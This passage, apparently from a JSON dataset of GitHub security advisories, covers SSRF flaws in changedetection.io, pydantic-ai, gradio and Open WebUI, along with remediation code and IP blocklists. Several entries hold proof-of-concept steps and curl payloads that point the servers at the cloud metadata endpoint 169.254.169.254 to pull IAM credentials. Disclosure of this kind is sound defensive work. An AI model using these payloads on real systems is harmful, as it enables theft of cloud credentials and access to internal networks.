DNS resolution or IP address validation:\n\n```python\n# changedetectionio/validate_url.py:60-122\n@lru_cache(maxsize=1000)\ndef is_safe_valid_url(test_url):\n\n    safe_protocol_regex = '^(http|https|ftp):'\n\n    # Check protocol\n    pattern = re.compile(os.getenv('SAFE_PROTOCOL_REGEX', safe_protocol_regex), re.IGNORECASE)\n    if not pattern.match(test_url.strip()):\n        return False\n\n    # Check URL format\n    if not validators.url(test_url, simple_host=True):\n        return False\n\n    return True  # No IP address validation performed\n```\n\nThe HTTP fetcher in `changedetectionio/content_fetchers/requests.py` (lines 83–89) then makes the request without any additional IP validation:\n\n```python\n# changedetectionio/content_fetchers/requests.py:83-89\nr = session.request(method=request_method,\n                    url=url,            # User-provided URL, no IP validation\n                    headers=request_headers,\n                    timeout=timeout,\n                    proxies=proxies,\n                    verify=False)\n```\nThe response content is stored and made available to the user:\n\n```python\n# changedetectionio/content_fetchers/requests.py:140-142\nself.content = r.text     # Text content stored\nself.raw_content = r.content  # Raw bytes stored\n```\nThis validation gap exists in all entry points that accept watch URLs:\n\n- Web UI: `changedetectionio/store/__init__.py:718`\n- REST API: `changedetectionio/api/watch.py:163, 428`\n- Import API: `changedetectionio/api/import.py:188`\n\nAll use the same `is_safe_valid_url()` function, so a single fix addresses all paths.\n\n---\n\n## PoC\n\n### Prerequisites\n\n- A changedetection.io instance (Docker deployment)\n- Network access to the instance (default port 5000)\n\n### Step 1: Deploy changedetection.io with an internal service\n\nCreate `internal-service.py`:\n```python\n#!/usr/bin/env python3\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nimport json\nclass H(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header('Content-Type', 'application/json')\n        self.end_headers()\n        self.wfile.write(json.dumps({\n            'Code': 'Success',\n            'AccessKeyId': 'AKIAIOSFODNN7EXAMPLE',\n            'SecretAccessKey': 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',\n            'Token': 'FwoGZXIvYXdzEBYaDExampleSessionToken'\n        }).encode())\nHTTPServer(('0.0.0.0', 80), H).serve_forever()\n```\n\nCreate `Dockerfile.internal`:\n```\nFROM python:3.11-slim\nCOPY internal-service.py /server.py\nCMD [\"python3\", \"/server.py\"]\n```\n\nCreate `docker-compose.yml`:\n```yaml\nversion: \"3.8\"\nservices:\n  changedetection:\n    image: ghcr.io/dgtlmoon/changedetection.io\n    ports:\n      - \"5000:5000\"\n    volumes:\n      - ./datastore:/datastore\n\n  internal-service:\n    build:\n      context: .\n      dockerfile: Dockerfile.internal\n```\n\nStart the stack:\n\n```bash\ndocker compose up -d\n```\n\n### Step 2: Add a watch for the internal service\n\nOpen `http://localhost:5000/` in a browser (no password required by default).\n\nIn the URL field, enter:\n```\nhttp://internal-service/\n```\nClick **Watch** and wait for the first check to complete.\n\n### Step 3: View the exfiltrated data\n\nClick on the watch entry, then click **Preview**. The page displays the internal service’s response containing the simulated credentials:\n```json\n{\n  \"Code\": \"Success\",\n  \"AccessKeyId\": \"AKIAIOSFODNN7EXAMPLE\",\n  \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n  ...\n}\n```\n<img width=\"2291\" height=\"780\" alt=\"Screenshot 2026-02-16 084212\" src=\"https://github.com/user-attachments/assets/115b69fb-ea10-4c47-a38c-409ede0e03cd\" />\n\n### Step 4: Verify via API (alternative)\n```bash\n# Get the API key (visible in Settings page of the unauthenticated web UI)\nAPI_KEY=$(docker compose exec changedetection cat /datastore/url-watches.json | \\\n  python3 -c \"import sys,json; print(json.load(sys.stdin)['settings']['application']['api_access_token'])\")\n\n# Create a watch via API\nWATCH_RESPONSE=$(curl -s -X POST \"http://localhost:5000/api/v1/watch\" \\\n  -H \"x-api-key: $API_KEY\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"url\": \"http://internal-service/\"}')\n\nWATCH_UUID=$(echo \"$WATCH_RESPONSE\" | python3 -c \"import sys,json; print(json.load(sys.stdin)['uuid'])\")\necho \"Watch created: $WATCH_UUID\"\n\n# Wait for the first fetch to complete\necho \"Waiting 30s for first fetch...\"\nsleep 30\n\n# Retrieve the exfiltrated data via API\nLATEST_TS=$(curl -s \"http://localhost:5000/api/v1/watch/$WATCH_UUID/history\" \\\n  -H \"x-api-key: $API_KEY\" | \\\n  python3 -c \"import sys,json; h=json.load(sys.stdin); print(sorted(h.keys())[-1]) if h else print('')\")\n\necho \"=== EXFILTRATED DATA ===\"\ncurl -s \"http://localhost:5000/api/v1/watch/$WATCH_UUID/history/$LATEST_TS\" \\\n  -H \"x-api-key: $API_KEY\"\n```\nExpected output — the internal service’s response containing simulated credentials:\n```json\n{\n  \"Code\": \"Success\",\n  \"AccessKeyId\": \"AKIAIOSFODNN7EXAMPLE\",\n  \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n  ...\n}\n```\n\nIn a real cloud deployment, replacing `http://internal-service/` with:\n\n```bash\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\n```\nwould return real AWS IAM credentials.\n\n<img width=\"1140\" height=\"607\" alt=\"Screenshot 2026-02-16 084407\" src=\"https://github.com/user-attachments/assets/cb1f5c02-6604-49e6-9e26-13406b190b45\" />\n\n---\n\n## Impact\n\n**Who is impacted:**  \nAll self-hosted changedetection.io deployments, particularly those running on cloud infrastructure (AWS, GCP, Azure) where the instance metadata service at `169.254.169.254` is accessible.\n\n**What an attacker can do:**\n\n- **Steal cloud credentials:** Access the cloud metadata endpoint to obtain IAM credentials, service account tokens, or managed identity tokens\n- **Scan internal networks:** Discover internal services by adding watches for internal IP ranges and observing responses\n- **Access internal services:** Read data from internal APIs, databases, and admin interfaces that are not exposed to the internet\n- **Persistent access:** Watches are fetched periodically on a configurable schedule, providing continuous access to internal resources\n- **No authentication required by default:** The web UI has no password set by default, allowing any user with network access to exploit this vulnerability\n\n---\n\n### Suggested Remediation\n\nAdd IP address validation to `is_safe_valid_url()` in `changedetectionio/validate_url.py`:\n\n```python\nimport ipaddress\nimport socket\n\nBLOCKED_NETWORKS = [\n    ipaddress.ip_network('127.0.0.0/8'),     # Loopback\n    ipaddress.ip_network('10.0.0.0/8'),      # Private (RFC 1918)\n    ipaddress.ip_network('172.16.0.0/12'),   # Private (RFC 1918)\n    ipaddress.ip_network('192.168.0.0/16'),  # Private (RFC 1918)\n    ipaddress.ip_network('169.254.0.0/16'),  # Link-local / Cloud metadata\n    ipaddress.ip_network('::1/128'),         # IPv6 loopback\n    ipaddress.ip_network('fc00::/7'),        # IPv6 unique local\n    ipaddress.ip_network('fe80::/10'),       # IPv6 link-local\n]\n\ndef is_private_ip(hostname):\n    \"\"\"Check if a hostname resolves to a private/reserved IP address.\"\"\"\n    try:\n        for info in socket.getaddrinfo(hostname, None):\n            ip = ipaddress.ip_address(info[4][0])\n            for network in BLOCKED_NETWORKS:\n                if ip in network:\n                    return True\n    except socket.gaierror:\n        return True  # Block unresolvable hostnames\n    return False\n```\n\nThen add to `is_safe_valid_url()` before the final `return True`:\n\n```python\n# Check for private/reserved IP addresses\nparsed = urlparse(test_url)\nif parsed.hostname and is_private_ip(parsed.hostname):\n    logger.warning(f\"URL '{test_url}' resolves to a private/reserved IP address\")\n    return False\n```\n\nAn environment variable (e.g., `ALLOW_PRIVATE_IPS=true`) could be provided for users who intentionally need to monitor internal services.",
+    "severity": "high",
+    "cvss_score": 8.6,
+    "cwes": [
+      "CWE-918"
+    ],
+    "published_at": "2026-02-25T19:08:18Z",
+    "references": [
+      "https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-3c45-4pj5-ch7m",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-27696",
+      "https://github.com/dgtlmoon/changedetection.io/commit/fe7aa38c651d73fe5f41ce09855fa8f97193747b",
+      "https://github.com/advisories/GHSA-3c45-4pj5-ch7m"
+    ],
+    "patch_urls": [
+      "https://github.com/dgtlmoon/changedetection.io/commit/fe7aa38c651d73fe5f41ce09855fa8f97193747b"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "changedetection.io",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 0.54.1"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-2jrp-274c-jhv3",
+    "cve_id": "CVE-2026-25580",
+    "summary": "Pydantic AI has Server-Side Request Forgery (SSRF) in URL Download Handling",
+    "description": "## Summary\n\nA Server-Side Request Forgery (SSRF) vulnerability exists in Pydantic AI's URL download functionality. When applications accept message history from untrusted sources, attackers can include malicious URLs that cause the server to make HTTP requests to internal network resources, potentially accessing internal services or cloud credentials.\n\n**This vulnerability only affects applications that accept message history from external users**, such as those using:\n- **`Agent.to_web`** or **`clai web`** to serve a chat interface\n- **`VercelAIAdapter`** for Vercel AI SDK integration\n- **`AGUIAdapter`** or **`Agent.to_ag_ui`** for AG-UI protocol integration\n- Custom APIs that accept message history from user input\n\nApplications that only use hardcoded or developer-controlled URLs are not affected.\n\n### Description\n\nThe `download_item()` helper function downloads content from URLs without validating that the target is a public internet address. When user-supplied message history contains URLs, attackers can:\n\n1. **Access internal services**: Request `http://127.0.0.1`, `localhost`, or private IP ranges (`10.x.x.x`, `172.16.x.x`, `192.168.x.x`)\n2. **Steal cloud credentials**: Access cloud metadata endpoints (AWS IMDSv1 at `169.254.169.254`, GCP, Azure, Alibaba Cloud)\n3. **Scan internal networks**: Enumerate internal hosts and ports\n\n### Who Is Affected\n\nYou are affected if your application:\n\n1. **Uses `Agent.to_web` or `clai web`** - The web interface accepts file attachments via the Vercel AI Data Stream Protocol, where users can provide arbitrary URLs through chat messages.\n\n2. **Uses `VercelAIAdapter`** - Chat interfaces built with Vercel AI SDK allow users to submit messages containing URLs that are processed server-side.\n\n3. **Uses `AGUIAdapter` or `Agent.to_ag_ui`** - The AG-UI protocol allows users to provide file references with URLs as part of agent interactions.\n\n4. **Exposes a custom API accepting message history** - Any endpoint that accepts message history or `ImageUrl`, `AudioUrl`, `VideoUrl`, `DocumentUrl` objects from user input.\n\n### Attack Scenario\n\nVia chat interface, an attacker submits a message with a file attachment pointing to an internal resource:\n```json\n{\n  \"role\": \"user\",\n  \"parts\": [\n    {\"type\": \"file\", \"mediaType\": \"image/png\", \"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}\n  ]\n}\n```\n\n### Affected Model Integrations\n\nMultiple model integrations download URL content in certain conditions:\n\n| Provider | Downloaded Types |\n|----------|------------------|\n| `OpenAIChatModel` | `AudioUrl`, `DocumentUrl` |\n| `AnthropicModel` | `DocumentUrl` (`text/plain`) |\n| `GoogleModel` (GLA) | All URL types (except YouTube and Files API URLs) |\n| `XaiModel` | `DocumentUrl` |\n| `BedrockConverseModel` | `ImageUrl`, `DocumentUrl`, `VideoUrl` (non-S3 URLs) |\n| `OpenRouterModel` | `AudioUrl` |\n\n## Remediation\n\n### Upgrade to Patched Version\n\n**Upgrade** to the patched version or later. The fix adds comprehensive SSRF protection:\n\n- Blocks private/internal IP addresses by default\n- Always blocks cloud metadata endpoints (even with `allow-local`)\n- Only allows `http://` and `https://` protocols\n- Resolves hostnames before requests to prevent DNS rebinding\n- Validates each redirect target\n\n### New `force_download='allow-local'` Option\n\nIf an application legitimately needs to access local/private network resources (e.g., in a fully trusted internal environment), it can explicitly opt in:\n\n```python\nfrom pydantic_ai import ImageUrl\n\n# Default behavior: private IPs are blocked\nImageUrl(url=\"http://internal-service/image.png\")  # Raises ValueError\n\n# Opt-in to allow local access (use with caution)\nImageUrl(url=\"http://internal-service/image.png\", force_download='allow-local')\n```\n\n**Important**: Cloud metadata endpoints (`169.254.169.254`, `fd00:ec2::254`, `100.100.100.200`) are **always blocked**, even with `allow-local`.\n\n### Workaround for Older Versions\n\nIf a project cannot upgrade immediately, use a [history processor](https://ai.pydantic.dev/message-history/#processing-message-history) to filter out URLs targeting local/private addresses:\n\n```python\nimport ipaddress\nimport socket\nfrom urllib.parse import urlparse\n\nfrom pydantic_ai import Agent, ModelMessage, ModelRequest\nfrom pydantic_ai.messages import AudioUrl, DocumentUrl, ImageUrl, VideoUrl\n\ndef is_private_url(url: str) -> bool:\n    \"\"\"Check if a URL targets a private/internal IP address.\"\"\"\n    try:\n        parsed = urlparse(url)\n        hostname = parsed.hostname\n        if not hostname:\n            return True  # Invalid URL, block it\n\n        # Resolve hostname to IP\n        ip_str = socket.gethostbyname(hostname)\n        ip = ipaddress.ip_address(ip_str)\n\n        # Block private, loopback, and link-local addresses\n        return ip.is_private or ip.is_loopback or ip.is_link_local\n    except (socket.gaierror, ValueError):\n        return True  # DNS resolution failed, block it\n\ndef filter_private_urls(messages: list[ModelMessage]) -> list[ModelMessage]:\n    \"\"\"Remove URL parts that target private/internal addresses.\"\"\"\n    url_types = (ImageUrl, AudioUrl, VideoUrl, DocumentUrl)\n    filtered = []\n    for msg in messages:\n        if isinstance(msg, ModelRequest):\n            safe_parts = [\n                part for part in msg.parts\n                if not (isinstance(part, url_types) and is_private_url(part.url))\n            ]\n            if safe_parts:\n                filtered.append(ModelRequest(parts=safe_parts))\n        else:\n            filtered.append(msg)\n    return filtered\n\n# Apply the filter to your agent\nagent = Agent('openai:gpt-5', history_processors=[filter_private_urls])\n```\n\n## Technical Details of the Fix\n\nThe fix introduces a new `_ssrf.py` module with comprehensive protection:\n\n1. **Protocol validation**: Only `http://` and `https://` allowed\n2. **DNS resolution before request**: Prevents DNS rebinding attacks\n3. **Private IP blocking** (by default):\n   - `127.0.0.0/8`, `::1/128` (loopback)\n   - `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` (private)\n   - `169.254.0.0/16`, `fe80::/10` (link-local)\n   - `100.64.0.0/10` (CGNAT)\n   - `fc00::/7` (unique local)\n   - `2002::/16` (6to4, can embed private IPv4)\n4. **Cloud metadata always blocked**: `169.254.169.254`, `fd00:ec2::254`, `100.100.100.200`\n5. **Safe redirect handling**: Each redirect validated before following (max 10)",
+    "severity": "high",
+    "cvss_score": 8.6,
+    "cwes": [
+      "CWE-918"
+    ],
+    "published_at": "2026-02-06T18:32:39Z",
+    "references": [
+      "https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-2jrp-274c-jhv3",
+      "https://github.com/pydantic/pydantic-ai/commit/d398bc9d39aecca6530fa7486a410d5cce936301",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-25580",
+      "https://github.com/advisories/GHSA-2jrp-274c-jhv3"
+    ],
+    "patch_urls": [
+      "https://github.com/pydantic/pydantic-ai/commit/d398bc9d39aecca6530fa7486a410d5cce936301"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "pydantic-ai",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 0.0.26, < 1.56.0"
+      },
+      {
+        "package": "pydantic-ai-slim",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 0.0.26, < 1.56.0"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-973g-55hp-3frw",
+    "cve_id": "CVE-2024-4325",
+    "summary": "Server-Side Request Forgery in gradio",
+    "description": "A Server-Side Request Forgery (SSRF) vulnerability exists in the gradio-app/gradio and was discovered in version 4.21.0, specifically within the `/queue/join` endpoint and the `save_url_to_cache` function. The vulnerability arises when the `path` value, obtained from the user and expected to be a URL, is used to make an HTTP request without sufficient validation checks. This flaw allows an attacker to send crafted requests that could lead to unauthorized access to the local network or the AWS metadata endpoint, thereby compromising the security of internal servers.",
+    "severity": "high",
+    "cvss_score": 8.6,
+    "cwes": [
+      "CWE-918"
+    ],
+    "published_at": "2024-06-06T18:30:58Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-4325",
+      "https://huntr.com/bounties/b34f084b-7d14-4f00-bc10-048a3a5aaf88",
+      "https://github.com/gradio-app/gradio/pull/8301",
+      "https://github.com/advisories/GHSA-973g-55hp-3frw"
+    ],
+    "patch_urls": [
+      "https://github.com/gradio-app/gradio/pull/8301"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "gradio",
+        "ecosystem": "pip",
+        "vulnerable_range": "<= 4.36.0"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-c6xv-rcvw-v685",
+    "cve_id": "CVE-2025-65958",
+    "summary": "Open WebUI vulnerable to Server-Side Request Forgery (SSRF) via Arbitrary URL Processing in /api/v1/retrieval/process/web",
+    "description": "### Summary\nA Server-Side Request Forgery (SSRF) vulnerability in Open WebUI allows any authenticated user to force the server to make HTTP requests to arbitrary URLs. This can be exploited to access cloud metadata endpoints (AWS/GCP/Azure), scan internal networks, access internal services behind firewalls, and exfiltrate sensitive information. No special permissions beyond basic authentication are required.\n\n\n### Details\nThe vulnerability exists in the /api/v1/retrieval/process/web endpoint located in backend/open_webui/routers/retrieval.py at lines 1758-1767.\n\n  Vulnerable code:\n  @router.post(\"/process/web\")\n  def process_web(\n      request: Request, form_data: ProcessUrlForm, user=Depends(get_verified_user)\n  ):\n      try:\n          collection_name = form_data.collection_name\n          if not collection_name:\n              collection_name = calculate_sha256_string(form_data.url)[:63]\n\n          content, docs = get_content_from_url(request, form_data.url)  # ← SSRF vulnerability\n\nThe form_data.url parameter is passed directly to get_content_from_url() without any validation. This function chain ultimately calls web loaders that fetch arbitrary URLs:\n\n  Call chain:\n  1. retrieval.py:1767 → get_content_from_url(request, form_data.url)\n  2. retrieval/utils.py:77 → get_loader(request, url)\n  3. retrieval/utils.py:62 → get_web_loader(url, ...) or YoutubeLoader(url, ...)\n  4. Both loaders fetch the user-supplied URL without validation\n\n  No validation is performed for:\n  - Private IP ranges (RFC1918: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)\n  - Localhost addresses (127.0.0.0/8)\n  - Cloud metadata endpoints (169.254.169.254, fd00:ec2::254)\n  - Protocol restrictions (file://, gopher://, etc.)\n  - Domain allowlisting\n\n\n### PoC\nPrerequisites: Valid user account (any role)\n\n  Step 1 - Authenticate:\n  TOKEN=$(curl -s \"http://localhost:3000/api/v1/auths/signin\" \\\n    -H 'Content-Type: application/json' \\\n    -d '{\"email\":\"user@example.com\",\"password\":\"password\"}' \\\n    | python3 -c \"import sys,json; print(json.load(sys.stdin)['token'])\")\n\n  Step 2 - Basic SSRF Test (external URL):\n  curl -s \"http://localhost:3000/api/v1/retrieval/process/web\" \\\n    -H \"Authorization: Bearer $TOKEN\" \\\n    -H 'Content-Type: application/json' \\\n    -d '{\"url\":\"http://example.com\"}'\n\n  Result: Server fetches example.com and returns its content, proving the vulnerability.\n\n  {\n    \"status\": true,\n    \"file\": {\n      \"data\": {\n        \"content\": \"Example Domain This domain is for use in documentation...\"\n      }\n    }\n  }\n\n  Step 3 - Advanced Attack (AWS metadata):\n  curl -s \"http://localhost:3000/api/v1/retrieval/process/web\" \\\n    -H \"Authorization: Bearer $TOKEN\" \\\n    -H 'Content-Type: application/json' \\\n    -d '{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}'\n\n  Result: Server exposes cloud credentials if running on AWS/GCP/Azure.\n\n  Other attack examples:\n  - Internal network: {\"url\":\"http://192.168.1.1\"}\n  - Localhost services: {\"url\":\"http://localhost:5432\"}\n  - Internal APIs: {\"url\":\"http://internal-api.local\"}\n\n\n### Impact\nWho is affected: All authenticated users (no special permissions required)\n\n  Attack capabilities:\n\n  1. Cloud Environment Compromise\n    - Steal AWS/GCP/Azure credentials via metadata endpoints\n    - Result: Full cloud account takeover\n  2. Internal Network Access\n    - Bypass firewalls to access internal services (databases, admin panels, APIs)\n    - Port scan and map internal infrastructure\n    - Result: Complete network visibility\n  3. Data Exfiltration\n    - Read internal documentation, configurations, secrets\n    - Access Kubernetes API servers\n    - Result: Credential theft, API key exposure",
+    "severity": "high",
+    "cvss_score": 8.5,
+    "cwes": [
+      "CWE-918"
+    ],
+    "published_at": "2025-12-04T22:03:19Z",
+    "references": [
+      "https://github.com/open-webui/open-webui/security/advisories/GHSA-c6xv-rcvw-v685",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-65958",
+      "https://github.com/open-webui/open-webui/commit/02238d3113e966c353fce18f1b65117380896774",
+      "https://github.com/advisories/GHSA-c6xv-rcvw-v685"
+    ],
+    "patch_urls": [
+      "https://github.com/open-webui/open-webui/commit/02238d3113e966c353fce18f1b65117380896774"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "open-webui",
+        "ecosystem": "pip",
+        "vulnerable_range": "<= 0.6.36"
+      }
+    ]
+  }
+]
